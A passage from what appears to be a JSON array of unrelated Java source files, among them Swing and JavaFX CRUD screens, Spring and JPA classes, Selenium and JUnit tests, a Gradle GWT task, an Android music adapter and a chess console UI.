crudDao.listar()) {\n                filaDatos[0] = p.getIdEmpleado();\n                filaDatos[1] = p.getNombres();\n                filaDatos[2] = p.getApellidoParterno();\n                filaDatos[3] = p.getApellidoMaterno();\n                filaDatos[4] = p.getDni();\n                filaDatos[5] = p.getNumeroTelefono();\n                filaDatos[6] = usuario.obtenerNombre(p.getIdUsuario());\n                filaDatos[7] = p.getSexo();\n                modelo.addRow(filaDatos);\n            }\n            //  tblProducto.setModel(modelo);\n        } catch (Exception e) {\n        }\n    }\n\n    public void buscar(java.awt.event.KeyEvent evt) {\n        try {\n            Empleado empleado;\n            if (vista.rdbId.isSelected()) {\n                empleado = new Empleado(Integer.parseInt(vista.txtBuscador.getText()));\n            } else if (vista.rdbNombre.isSelected()) {\n                empleado = new Empleado(vista.txtBuscador.getText());\n            } else {\n                JOptionPane.showMessageDialog(null, \"Seleccionar una opci\u00f3n para buscar\");\n                return;\n            }\n            limpiarTabla();\n            int n = 0;\n            if (crudDao.listar(empl",
    "import java.util.ArrayList;\nimport java.util.Scanner;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.io.IOException;\n\npublic class PersonGenerator {\n    public static void main(String[] args) {\n        try (Scanner scanner = new Scanner(System.in)) {\n            ArrayList<String> persons = new ArrayList<>();\n            boolean done = false;\n\n            while (!done) {\n                System.out.println(\"Enter the person's details:\");\n                String id = SafeInput.getRegExString(scanner, \"Enter ID (a String)\", \"\\\\d+\");\n                String firstName = SafeInput.getNonZeroLenString(scanner, \"Enter First Name\");\n                String lastName = SafeInput.getNonZeroLenString(scanner, \"Enter Last Name\");\n                String title = SafeInput.getNonZeroLenString(scanner, \"Enter Title (Mr., Mrs., Ms., Dr., etc.)\");\n                int yearOfBirth = SafeInput.getRangedInt(scanner, \"Enter Year Of Birth\", 0, 2024);\n\n                persons.add(String.format(\"%s, %s, %s, %s, %d\", id, firstName, lastName, title, yearOfBirth));\n                done = !SafeInput.getYNConfirm(scanner, \"Do you want to add another person?\");\n            }\n\n            String filename = SafeInput.getNonZeroLenString(scanner, \"Enter the name of the file to save (e.g., Persons.txt)\");\n            savePersonsToFile(filename, persons);\n        } catch (Exception e) {\n            System.out.println(\"An unexpected error occurred: \" + e.getMessage());\n        }\n    }\n\n    private static void savePersonsToFile(String filename, ArrayList<String> persons) {\n        try {\n            Files.write(Paths.get(filename), persons, StandardOpenOption.CREATE, StandardOpenOption.APPEND);\n            System.out.println(\"File saved successfully!\");\n        } catch (IOException e) {\n            System.out.println(\"An error occurred while saving the file: \" + e.getMessage());\n        }\n    }\n}\n",
    "package com.metro.Metro.service;\nimport org.springframework.stereotype.Service;\n\nimport com.metro.Metro.model.Station;\nimport com.metro.Metro.repository.StationRepo;\n\n\n@Service\npublic class StationServiceImpl implements StationService{\n\n\tprivate final StationRepo stationRepo;\n\t\n\t\n\tpublic StationServiceImpl(StationRepo stationRepo){\n\t\tthis.stationRepo=stationRepo;\n\t}\n\t\n\t\n\t@Override\n\tpublic Station saveStation(Station station) {\n\t\tStation savedStation = stationRepo.save(station);\n\t\treturn savedStation;\n\t}\n\n\n\t@Override\n\tpublic Double calculateFareBasedOnDistance(String sourceStation, String destinationStation) {\n\t\tdouble fare;\n\t\tdouble distance;\n\t\tStation startingStation = stationRepo.findByStationName(sourceStation);\n\t\tStation destination = stationRepo.findByStationName(destinationStation);\n\t\t\n\t\tif (startingStation.getDistance() >  destination.getDistance()) {\n\t\t\t distance = startingStation.getDistance() - destination.getDistance();\n\t\t}\n\t\telse {\n\t\t\t distance =  destination.getDistance() - startingStation.getDistance();\n\t\t}\n\t\tif(distance < 5.00 ) {\n\t\t\tfare=5.00;\n\t\t}\n\t\telse if (distance <10.00  && distance >5.00) {\n\t\tfare = 10.00 ;\n\t\t}\n\t\telse if (distance <15.00  && distance >10.00) {\n\t\t\tfare = 15.00 ;\n\t\t\t}\n\t\telse {\n\t\t\tfare =20.00;\n\t\t}\n\t\treturn fare;\n\t}\n\n\t\n}\n",
    "import org.openqa.selenium.By;\nimport org.openqa.selenium.WebDriver;\nimport org.openqa.selenium.WebElement;\nimport org.openqa.selenium.chrome.ChromeDriver;\nimport org.testng.annotations.AfterTest;\nimport org.testng.annotations.BeforeTest;\nimport org.testng.annotations.Test;\nimport org.testng.asserts.SoftAssert;\n\npublic class product_Quantity extends TestBase{\n    @Test\n    public void verify_ProductQuantity(){\n        By verifyHomePage = By.cssSelector(\"html[lang=\\\"en\\\"]\");\n        if(bytoWebElement(verifyHomePage).isDisplayed()) {\n            System.out.println(\"home page is visible successfully\");\n        }\n        By viewProduct = By.cssSelector(\"a[href=\\\"/product_details/2\\\"]\");\n        bytoWebElement(viewProduct).click();\n        try {\n            Thread.sleep(6000);\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        }\n        By quantityNumber = By.name(\"quantity\");\n        bytoWebElement(quantityNumber).clear();\n        bytoWebElement(quantityNumber).sendKeys(\"4\");\n        By addCart = By.cssSelector(\"button[type=\\\"button\\\"]\");\n        bytoWebElement(addCart).click();\n\n        try {\n            Thread.sleep(2000);\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        }\n        By viewCart = By.xpath(\"//*[@id=\\\"cartModal\\\"]/div/div/div[2]/p[2]/a\");\n        bytoWebElement(viewCart).click();\n        softAssert.assertAll();\n\n    }\n\n}\n",
    "package com.admin.model;\n\nimport com.admin.handler.LineDataProxy;\nimport lombok.*;\nimport org.hibernate.annotations.DynamicInsert;\nimport org.hibernate.annotations.DynamicUpdate;\nimport xyz.erupt.annotation.Erupt;\nimport xyz.erupt.annotation.EruptField;\nimport xyz.erupt.annotation.sub_field.Edit;\nimport xyz.erupt.annotation.sub_field.EditType;\nimport xyz.erupt.annotation.sub_field.View;\nimport xyz.erupt.annotation.sub_field.sub_edit.ChoiceType;\nimport xyz.erupt.annotation.sub_field.sub_edit.Search;\nimport xyz.erupt.toolkit.handler.SqlChoiceFetchHandler ;\n\nimport javax.persistence.*;\nimport java.io.Serializable;\n\n/**\n * \u7ebf\u8def\u7ba1\u7406\n */\n@Erupt(name = \"\u7ebf\u8def\",\n        primaryKeyCol = \"line_id\",\n        dataProxy = LineDataProxy.class\n)\n@Table(name = \"line\")\n@Entity\n@Data\n@DynamicUpdate\n@DynamicInsert\npublic class Line implements Serializable {\n\n    @EruptField(\n            views = @View(\n                    title = \"\u7ebf\u8def\u7f16\u53f7\"\n            )\n    )\n    @Id\n    @GeneratedValue(strategy = GenerationType.AUTO)\n    @Column(name = \"line_id\")\n    private Integer line_id;\n\n    @EruptField(\n            views = @View(\n                    title = \"\u8d77\u59cb\u7ad9\u70b9\"\n            ),\n            edit = @Edit(\n                    search = @Search(vague = true),\n                    title = \"\u8d77\u59cb\u7ad9\u70b9\",\n                    notNull = true,\n                    type = EditType.CHOICE,\n                    desc = \"\u83b7\u53d6\u5df2\u6709\u7684\u7ad9\u70b9\u540d\",\n                    choiceType = @ChoiceType(\n                            fetchHandler = SqlChoiceFetchHandler.class,\n                            fetchHandlerParams = \"select station_name from station\"\n                    )\n            )\n    )\n    @Column(name = \"line_start_station_name\")\n    private String line_start_station_name;\n\n    @EruptField(\n            views = @View(\n                    title = \"\u5230\u8fbe\u7ad9\u70b9\"\n            ),\n            edit = @Edit(\n                    search = @Search(vague = true),\n                    title = \"\u5230\u8fbe\u7ad9\u70b9\",\n                    notNull = true,\n                    type = EditType.CHOICE,\n                    desc = \"\u83b7\u53d6\u5df2\u6709\u7684\u7ad9\u70b9\u540d\",\n                    choiceType = @ChoiceType(\n                            fetchHandler = SqlChoiceFetchHandler.class,\n                            fetchHandlerParams = \"select station_name from station\"\n                    )\n            )\n    )\n    @Column(name = \"line_end_station_name\")\n    private String line_end_station_name;\n\n}\n",
    "package gwt.example.gradle;\n\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport javax.inject.Inject;\nimport org.gradle.api.DefaultTask;\nimport org.gradle.api.file.ConfigurableFileCollection;\nimport org.gradle.api.file.DirectoryProperty;\nimport org.gradle.api.file.FileCollection;\nimport org.gradle.api.file.FileSystemOperations;\nimport org.gradle.api.provider.ListProperty;\nimport org.gradle.api.provider.Property;\nimport org.gradle.api.tasks.Classpath;\nimport org.gradle.api.tasks.Input;\nimport org.gradle.api.tasks.InputFiles;\nimport org.gradle.api.tasks.Internal;\nimport org.gradle.api.tasks.LocalState;\nimport org.gradle.api.tasks.Nested;\nimport org.gradle.api.tasks.Optional;\nimport org.gradle.api.tasks.OutputDirectory;\nimport org.gradle.api.tasks.PathSensitive;\nimport org.gradle.api.tasks.PathSensitivity;\nimport org.gradle.api.tasks.SkipWhenEmpty;\nimport org.gradle.api.tasks.TaskAction;\nimport org.gradle.jvm.toolchain.JavaLauncher;\nimport org.gradle.process.ExecOperations;\nimport org.gradle.work.DisableCachingByDefault;\nimport org.gradle.work.NormalizeLineEndings;\n\n@DisableCachingByDefault\npublic abstract class GwtCodeServer extends DefaultTask {\n\n  @Inject\n  protected abstract ExecOperations getExecOperations();\n\n  @Nested\n  public abstract Property<JavaLauncher> getJavaLauncher();\n\n  @Classpath\n  public abstract ConfigurableFileCollection getClasspath();\n\n  @Internal\n  public abstract ConfigurableFileCollection getSourceDirectories();\n\n  @InputFiles\n  @SkipWhenEmpty\n  @PathSensitive(PathSensitivity.RELATIVE)\n  FileCollection getSources() {\n    return getSourceDirectories().getAsFileTree();\n  }\n\n  // TODO: more specific JVM arguments (incl. memory); see org.gradle.process.JavaForkOptions\n  @Input\n  public abstract ListProperty<Object> getJvmArgs();\n\n  public void jvmArgs(Object... args) {\n    getJvmArgs().appendAll(args);\n  }\n\n  public void jvmArgs(Iterable<?> args) {\n    getJvmArgs().appendAll(args);\n  }\n\n  @Input\n  public abstract ListProperty<Object> getArgs();\n\n  public void args(Object... args) {\n    getArgs().appendAll(args);\n  }\n\n  public void args(Iterable<?> args) {\n    getArgs().appendAll(args);\n  }\n\n  @Input\n  public abstract Property<String> getModuleName();\n\n  @OutputDirectory @Optional\n  public abstract DirectoryProperty getLauncherDir();\n\n  @LocalState\n  public abstract DirectoryProperty getWorkDir();\n\n  @LocalState\n  public abstract DirectoryProperty getUnitCacheDir();\n\n  // TODO: @Option (as @Input or @Console) for failOnError, logLevel, sourceLevel and style\n\n  {\n    // Never up-to-date, we always want to run the task if invoked\n    getOutputs().upToDateWhen(task -> false);\n  }\n\n  @TaskAction\n  void run() throws IOException {\n    Files.createDirectories(getWorkDir().get().getAsFile().toPath());\n    var result = getExecOperations().javaexec(spec -> {\n      spec.executable(getJavaLauncher().get().getExecutablePath());\n\n      // disable --module-path\n      spec.getModularity().getInferModulePath().set(false);\n\n      // TODO: use -src for getSourceDirectories() ?\n      //       ideally this would extract source dirs from project dependencies too\n      spec.classpath(getSourceDirectories(), getClasspath());\n      spec.getMainClass().set(\"com.google.gwt.dev.codeserver.CodeServer\");\n\n      spec.jvmArgs(getJvmArgs().get());\n      spec.systemProperty(\"gwt.persistentunitcachedir\", getUnitCacheDir().get());\n\n      spec.args(getArgs().get());\n      spec.args(\"-workDir\", getWorkDir().get());\n      if (getLauncherDir().isPresent()) {\n        spec.args(\"-launcherDir\", getLauncherDir().get());\n      }\n      spec.args(getModuleName().get());\n    });\n    result.assertNormalExitValue();\n  }\n}\n",
    "/*\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\n * Click nbfs://nbhost/SystemFileSystem/Templates/GUIForms/JFrame.java to edit this template\n */\npackage com.lojaInformatica.projeto_integrador;\nimport javax.swing.table.DefaultTableModel;\n\n/**\n *\n * @author Giovanna\n */\npublic class TelaClienteCRUD extends javax.swing.JFrame {\n\n    /**\n     * Creates new form TelaClienteCRUD\n     */\n    public TelaClienteCRUD() {\n        initComponents();\n    }\n\n    /**\n     * This method is called from within the constructor to initialize the form.\n     * WARNING: Do NOT modify this code. The content of this method is always\n     * regenerated by the Form Editor.\n     */\n    @SuppressWarnings(\"unchecked\")\n    // <editor-fold defaultstate=\"collapsed\" desc=\"Generated Code\">//GEN-BEGIN:initComponents\n    private void initComponents() {\n\n        jPanel1 = new javax.swing.JPanel();\n        jLabel1 = new javax.swing.JLabel();\n        jLabel2 = new javax.swing.JLabel();\n        jLabel3 = new javax.swing.JLabel();\n        jLabel4 = new javax.swing.JLabel();\n        jLabel5 = new javax.swing.JLabel();\n        jLabel6 = new javax.swing.JLabel();\n        jLabel7 = new javax.swing.JLabel();\n        jLabel8 = new javax.swing.JLabel();\n        jLabel9 = new javax.swing.JLabel();\n        jTextField1 = new javax.swing.JTextField();\n        jTextField2 = new javax.swing.JTextField();\n        jTextField3 = new javax.swing.JTextField();\n        jTextField4 = new javax.swing.JTextField();\n        jComboBox1 = new javax.swing.JComboBox<>();\n        jComboBox2 = new javax.swing.JComboBox<>();\n        jButton1 = new javax.swing.JButton();\n        jFormattedTextField1 = new javax.swing.JFormattedTextField();\n        jFormattedTextField2 = new javax.swing.JFormattedTextField();\n        jFormattedTextField3 = new javax.swing.JFormattedTextField();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        jTable1 = new javax.swing.JTable();\n        jButton2 = new javax.swing.JButton();\n        jButton3 = new javax.swing.JButton();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        jPanel1.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, java.awt.Color.gray, java.awt.Color.lightGray, java.awt.Color.white, java.awt.Color.darkGray));\n\n        jLabel1.setFont(new java.awt.Font(\"Segoe UI\", 1, 12)); // NOI18N\n        jLabel1.setText(\"Nome:\");\n\n        jLabel2.setFont(new java.awt.Font(\"Segoe UI\", 1, 12)); // NOI18N\n        jLabel2.setText(\"Sobrenome:\");\n\n        jLabel3.setFont(new java.awt.Font(\"Segoe UI\", 1, 12)); // NOI18N\n        jLabel3.setText(\"E-mail:\");\n\n        jLabel4.setFont(new java.awt.Font(\"Segoe UI\", 1, 12)); // NOI18N\n        jLabel4.setText(\"CEP:\");\n\n        jLabel5.setFont(new java.awt.Font(\"Segoe UI\", 1, 12)); // NOI18N\n        jLabel5.setText(\"CPF:\");\n\n        jLabel6.setFont(new java.awt.Font(\"Segoe UI\", 1, 12)); // NOI18N\n        jLabel6.setText(\"Telefone:\");\n\n        jLabel7.setFont(new java.awt.Font(\"Segoe UI\", 1, 12)); // NOI18N\n        jLabel7.setText(\"Sexo:\");\n\n        jLabel8.setFont(new java.awt.Font(\"Segoe UI\", 1, 12)); // NOI18N\n        jLabel8.setText(\"Estado civil:\");\n\n        jLabel9.setFont(new java.awt.Font(\"Segoe UI\", 1, 12)); // NOI18N\n        jLabel9.setText(\"Data de nascimento:\");\n\n        jTextField1.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jTextField1ActionPerformed(evt);\n            }\n        });\n\n        jTextField2.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jTextField2ActionPerformed(evt);\n            }\n        });\n\n        jComboBox1.setModel(new javax.swing.DefaultComboBoxModel<>(new String[] { \"Solteiro (a)\", \"Casado (a)\", \"Divorciado (a)\", \"Vi\u00favo (a)\" }));\n\n        jComboBox2.setModel(new javax.swing.DefaultComboBoxModel<>(new String[] { \"Masculino\", \"Feminino\", \"Prefiro n\u00e3o dizer\" }));\n\n        jButton1.setText(\"Cadastrar >>\");\n        jButton1.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jButton1ActionPerformed(evt);\n            }\n        });\n\n        try {\n            jFormattedTextField1.setFormatterFactory(new javax.swing.text.DefaultFormatterFactory(new javax.swing.text.MaskFormatter(\"(##) ##-#########\")));\n        } catch (java.text.ParseException ex) {\n            ex.printStackTrace();\n        }\n\n        try {\n            jFormattedTextField2.setFormatterFactory(new javax.swing.text.DefaultFormatterFactory(new javax.swing.text.MaskFormatter(\"###.###.###-##\")));\n        } catch (java.text.ParseException ex) {\n            ex.printStackTrace();\n        }\n\n        jFormattedTextField3.setFormatterFactory(new javax.swing.text.DefaultFormatterFactory(new javax.swing",
    "package com.campusdual.classroom;\n\nimport org.junit.jupiter.api.AfterEach;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.PrintStream;\n\nimport static org.junit.jupiter.api.Assertions.*;\n\nclass Exercise03Test {\n\n    private final ByteArrayOutputStream outContent = new ByteArrayOutputStream();\n    private final ByteArrayOutputStream errContent = new ByteArrayOutputStream();\n    private final PrintStream originalOut = System.out;\n    private final PrintStream originalErr = System.err;\n\n    @BeforeEach\n    void setUp() {\n        System.setOut(new PrintStream(this.outContent));\n        System.setErr(new PrintStream(this.errContent));\n    }\n\n    @AfterEach\n    void tearDown() {\n        System.setOut(this.originalOut);\n        System.setErr(this.originalErr);\n    }\n\n    @Test\n    @DisplayName(\"Test greetings message. Username provided \u2192 TestUser\")\n    void testGreetingMessage(){\n        String user = \"TestUser\";\n        assertEquals(\"Hola. Bienvenido TestUser\", Exercise03.greetings(user), \"Message is not correct.\");\n    }\n\n    @Test\n    @DisplayName(\"Test error message. Username provided \u2192 TestUser\")\n    void testErrorMessage(){\n        String user = \"TestUser\";\n        assertEquals(\"Ups. No pudimos validar tus datos. Tu nombre de usuario no es TestUser\", Exercise03.error(user), \"Message is not correct.\");\n    }\n\n    @Test\n    @DisplayName(\"Test successful check user. Username provided \u2192 Sebas, pass provided \u2192 sebas01 \")\n    void testSuccessfulVerify(){\n        Exercise03.checkUser(\"Sebas\", \"sebas01\");\n        boolean check = this.outContent.toString().contains(\"Hola. Bienvenido Sebas\");\n        assertTrue(check, \"Greetings message is not correct\");\n\n    }\n\n    @Test\n    @DisplayName(\"Test unsuccessful check user. Username provided \u2192 TestUser, pass provided \u2192 sebas01 \")\n    void testUnsuccessfulVerify(){\n        Exercise03.checkUser(\"TestUser\", \"sebas01\");\n        boolean check = this.outContent.toString().contains(\"Ups. No pudimos validar tus datos. Tu nombre de usuario no es Sebas\");\n        assertTrue(check, \"Error message is not correct\");\n    }\n\n}",
    "package com.campusdual.classroom;\n\nimport org.junit.jupiter.api.AfterEach;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.PrintStream;\n\nimport static org.junit.jupiter.api.Assertions.*;\n\nclass Exercise02Test {\n\n    private final ByteArrayOutputStream outContent = new ByteArrayOutputStream();\n    private final ByteArrayOutputStream errContent = new ByteArrayOutputStream();\n    private final PrintStream originalOut = System.out;\n    private final PrintStream originalErr = System.err;\n\n    @BeforeEach\n    void setUp() {\n        System.setOut(new PrintStream(this.outContent));\n        System.setErr(new PrintStream(this.errContent));\n    }\n\n    @AfterEach\n    void tearDown() {\n        System.setOut(this.originalOut);\n        System.setErr(this.originalErr);\n    }\n\n    @Test\n    @DisplayName(\"Test if the circumference area is correct\")\n    void testCircumferenceArea(){\n        Exercise02.main(new String[0]);\n        boolean check = this.outContent.toString().contains(\"706\");\n        assertTrue(check, \"Circumference area is not correct. Approx: 706.5\");\n    }\n\n    @Test\n    @DisplayName(\"Test if the circumference length is correct\")\n    void testCircumferenceLength(){\n        Exercise02.main(new String[0]);\n        boolean check = this.outContent.toString().contains(\"94\");\n        assertTrue(check, \"Circumference length is not correct. Approx: 94.2\");\n    }\n\n}",
    "package SauceDemoPages;\n\nimport org.openqa.selenium.By;\nimport org.openqa.selenium.WebDriver;\nimport org.openqa.selenium.WebElement;\nimport org.openqa.selenium.support.ui.ExpectedConditions;\n\npublic class LoginPage extends Page {\n    private By usernameBy = new By.ById((\"user-name\"));\n    private By passWordBy = new By.ById(\"password\");\n    private By signInButtonBy = new By.ById(\"login-button\");\n\n    private By responseStringBy = new By.ByCssSelector(\"div.error-message-container.error\");\n    public LoginPage(WebDriver webDriver) {\n        super(webDriver);\n    }\n\n    public void fillInUserName(String name) {\n        WebElement userNameBox = webDriverWait.until(\n                ExpectedConditions.visibilityOfElementLocated(usernameBy));\n        userNameBox.sendKeys(name);\n    }\n\n    public void fillInPassword(String password) {\n        WebElement pwBox = webDriverWait.until(\n                ExpectedConditions.visibilityOfElementLocated(passWordBy));\n        pwBox.sendKeys(password);\n    }\n\n    public void click() {\n        WebElement pwButton = webDriverWait.until(\n                ExpectedConditions.visibilityOfElementLocated(signInButtonBy));\n        pwButton.click();\n    }\n\n    public String getResponseString() {\n        WebElement responseString = webDriverWait.until(\n                ExpectedConditions.visibilityOfElementLocated(responseStringBy));\n        return responseString.getText();\n    }\n\n}\n\n\n",
    "package com.goattechnologies.pos;\n\nimport javafx.fxml.FXML;\nimport javafx.geometry.Pos;\nimport javafx.scene.Node;\nimport javafx.scene.control.Label;\nimport javafx.scene.control.TextField;\nimport javafx.fxml.FXMLLoader;\nimport javafx.scene.text.Font;\n\nimport java.io.IOException;\nimport java.util.List;\nimport java.util.Objects;\n\n/**\n * This class manages\n * the display and interaction with the update ingredient view, which allows the user to update an ingredient in the\n * database.\n * @Author Mohsin Khan\n */\npublic class UpdateIngredientController {\n    @FXML\n    private TextField ingredientNameField;\n    @FXML\n    private TextField quantityField;\n    @FXML\n    private TextField costField;\n    @FXML\n    private Label updateIngredient;\n    @FXML\n    private Label name;\n    @FXML\n    private Label quantity;\n    @FXML\n    private Label cost;\n\n    private Ingredient selectedIngredient;\n    private String oldName;\n\n    /**\n     * Initializes the UpdateIngredientController, setting up the text fields.\n     */\n    public void initialize() {\n        Font customFont = Font.font(\"Arial\", 20);\n        updateIngredient.setFont(customFont);\n        name.setFont(customFont);\n        quantity.setFont(customFont);\n        cost.setFont(customFont);\n\n        Font largerFont = new Font(28);\n        ingredientNameField.setFont(largerFont);\n        ingredientNameField.setAlignment(Pos.CENTER);\n        quantityField.setFont(largerFont);\n        quantityField.setAlignment(Pos.CENTER);\n        costField.setFont(largerFont);\n        costField.setAlignment(Pos.CENTER);\n    }\n\n    /**\n     * Sets the selected ingredient to be updated.\n     * @param ingredient The ingredient to be updated.\n     */\n    public void setSelectedIngredient(Ingredient ingredient) {\n        this.selectedIngredient = ingredient;\n        this.oldName = ingredient.getIngredientName();\n\n        // Populate the text fields with the current data\n        ingredientNameField.setText(selectedIngredient.getIngredientName());\n        quantityField.setText(String.valueOf(selectedIngredient.getQuantity()));\n        costField.setText(String.valueOf(selectedIngredient.getCost()));\n    }\n\n    /**\n     * Updates the ingredient in the database.\n     */\n    public void updateIngredient() {\n        String newName = ingredientNameField.getText();\n        int newQuantity = Integer.parseInt(quantityField.getText());\n        double newCost = Double.parseDouble(costField.getText());\n\n        if (!oldName.equals(newName) && ingredientExists(Main.ingredients, newName)) {\n            AlertUtil.showWarning(\"Ingredient Warning\", \"Unable to Update Ingredient\", \"This ingredient name already exists!\");\n            backToInventory();\n            return;\n        }\n\n        selectedIngredient.setIngredientName(newName);\n        selectedIngredient.setQuantity(newQuantity);\n        selectedIngredient.setCost(newCost);\n\n        Main.dbManager.updateIngredient(selectedIngredient);\n\n        backToInventory();\n    }\n\n    /**\n     * Deletes the ingredient from the database.\n     */\n    public void deleteIngredient() {\n        Main.dbManager.deleteIngredient(selectedIngredient.getIngredientId());\n        backToInventory();\n    }\n\n    /**\n     * Navigates back to the inventory view.\n     */\n    public void backToInventory() {\n        try {\n            Node node = FXMLLoader.load(Objects.requireNonNull(getClass().getResource(\"inventory-view.fxml\")));\n            Main.getMainController().setView(node);\n        } catch (IOException e) {\n            AlertUtil.showWarning(\"Error\", \"Error loading inventory view\", \"Please try again later: \" + e.getMessage());\n        }\n    }\n\n    /**\n     * Checks if an ingredient exists in a list of ingredients.\n     * @param ingredientList The list of ingredients to check.\n     * @param ingredientNameToFind The ingredient name to find.\n     * @return True if the ingredient exists, false otherwise.\n     */\n    public boolean ingredientExists(List<Ingredient> ingredientList, String ingredientNameToFind) {\n        for (Ingredient ingredient : ingredientList) {\n            if (ingredient.getIngredientName().equalsIgnoreCase(ingredientNameToFind)) {\n                return true;\n            }\n        }\n        return false;\n    }\n}",
    "package com.example.musicplayer;\n\nimport android.annotation.SuppressLint;\nimport android.content.Context;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.RelativeLayout;\nimport android.widget.TextView;\n\nimport androidx.annotation.NonNull;\nimport androidx.recyclerview.widget.RecyclerView;\n\nimport java.util.List;\nimport java.util.Locale;\nimport java.util.concurrent.TimeUnit;\n\npublic class MusicAdaptor extends RecyclerView.Adapter<MusicAdaptor.MyViewHolder> {\n\n    private List <MusicList> list;\n    private final Context context;\n    private int playingPosition = 0;\n    private final SongChangeListener songChangeListener;\n\n    public MusicAdaptor(List<MusicList> list, Context context) {\n        this.list = list;\n        this.context = context;\n        this.songChangeListener = ((SongChangeListener)context);\n    }\n\n    @SuppressLint(\"InflateParams\")\n    @NonNull\n    @Override\n    public MusicAdaptor.MyViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {\n        return new MyViewHolder(LayoutInflater.from(parent.getContext()).inflate(R.layout.music_adapter_layout,null));\n    }\n\n    @Override\n    public void onBindViewHolder(@NonNull MusicAdaptor.MyViewHolder holder, @SuppressLint(\"RecyclerView\") int position) {\n        MusicList list2 = list.get(position);\n\n        if (list2.isPlaying()){\n            playingPosition = position;\n            holder.rootLayout.setBackgroundResource(R.drawable.round_back_blue_10);\n        }\n        else {\n            holder.rootLayout.setBackgroundResource(R.drawable.round_back_10);\n        }\n        String generateDuration = String.format(Locale.getDefault() , \"%02d:%02d\",\n                TimeUnit.MILLISECONDS.toMinutes(Long.parseLong(list2.getDuration())),\n                TimeUnit.MILLISECONDS.toSeconds(Long.parseLong(list2.getDuration())) -\n                TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS.toMinutes(Long.parseLong(list2.getDuration()))));\n        holder.title.setText(list2.getTitle());\n        holder.artist.setText(list2.getArtist());\n        holder.musicDuration.setText(generateDuration);\n\n        holder.rootLayout.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n\n                list.get(playingPosition).setPlaying(false);\n                list2.setPlaying(true);\n\n                songChangeListener.onChanged(position);\n\n                notifyDataSetChanged();\n            }\n        });\n    }\n\n    public void updateList(List<MusicList> list){\n        this.list = list;\n        notifyDataSetChanged();\n    }\n\n    @Override\n    public int getItemCount() {\n        return list.size();\n    }\n   static class MyViewHolder extends RecyclerView.ViewHolder {\n\n        private final RelativeLayout rootLayout;\n        private final TextView title;\n        private final TextView artist;\n        private final TextView musicDuration;\n\n        public MyViewHolder(@NonNull View itemView) {\n            super(itemView);\n\n            rootLayout = itemView.findViewById(R.id.rootLayout);\n            title = itemView.findViewById(R.id.musicTitle);\n            artist = itemView.findViewById(R.id.musicArtist);\n            musicDuration = itemView.findViewById(R.id.musicDuration);\n\n\n        }\n    }\n}\n",
    "package application;\n\nimport java.util.Arrays;\nimport java.util.InputMismatchException;\nimport java.util.List;\nimport java.util.Scanner;\nimport java.util.stream.Collectors;\n\nimport chess.ChessMatch;\nimport chess.ChessPiece;\nimport chess.ChessPosition;\nimport chess.Color;\n\npublic class UI {\n\n\t// https://stackoverflow.com/questions/5762491/how-to-print-color-in-console-using-system-out-println\n\n\tpublic static final String ANSI_RESET = \"\\u001B[0m\";\n\tpublic static final String ANSI_BLACK = \"\\u001B[30m\";\n\tpublic static final String ANSI_RED = \"\\u001B[31m\";\n\tpublic static final String ANSI_GREEN = \"\\u001B[32m\";\n\tpublic static final String ANSI_YELLOW = \"\\u001B[33m\";\n\tpublic static final String ANSI_BLUE = \"\\u001B[34m\";\n\tpublic static final String ANSI_PURPLE = \"\\u001B[35m\";\n\tpublic static final String ANSI_CYAN = \"\\u001B[36m\";\n\tpublic static final String ANSI_WHITE = \"\\u001B[37m\";\n\n\tpublic static final String ANSI_BLACK_BACKGROUND = \"\\u001B[40m\";\n\tpublic static final String ANSI_RED_BACKGROUND = \"\\u001B[41m\";\n\tpublic static final String ANSI_GREEN_BACKGROUND = \"\\u001B[42m\";\n\tpublic static final String ANSI_YELLOW_BACKGROUND = \"\\u001B[43m\";\n\tpublic static final String ANSI_BLUE_BACKGROUND = \"\\u001B[44m\";\n\tpublic static final String ANSI_PURPLE_BACKGROUND = \"\\u001B[45m\";\n\tpublic static final String ANSI_CYAN_BACKGROUND = \"\\u001B[46m\";\n\tpublic static final String ANSI_WHITE_BACKGROUND = \"\\u001B[47m\";\n\t\n\t// https://stackoverflow.com/questions/2979383/java-clear-the-console\n\tpublic static void clearScreen() {\n\t\tSystem.out.print(\"\\033[H\\033[2J\");\n\t\tSystem.out.flush();\n\t}\n\t\n\t\n\tpublic static ChessPosition readChessPosition(Scanner sc){\n\t\ttry {\n\t\t\tString s = sc.nextLine().toLowerCase();\n\t\t\tchar column = s.charAt(0);\n\t\t\tint row = Integer.parseInt(s.substring(1));\n\t\t\treturn new ChessPosition(column, row);\n\t\t} catch (RuntimeException e){\n\t\t\tthrow new InputMismatchException(\"Erro ao ler a posicao. Valores validos sao de a1 ate h8.\");\n\t\t}\n\t}\n\t\n\tpublic static void printMatch(ChessMatch chessMatch, List<ChessPiece> captured){\n\t\tprintBoard(chessMatch.getPieces());\n\t\tSystem.out.println();\n\t\tprintCapturedPieces(captured);\n\t\tSystem.out.println();\n\t\tSystem.out.println(\"Turn: \" + chessMatch.getTurn());\n\t\tif(!chessMatch.getCheckMate()){\n\t\t\tSystem.out.println(\"Aguardando o jogador: \" + 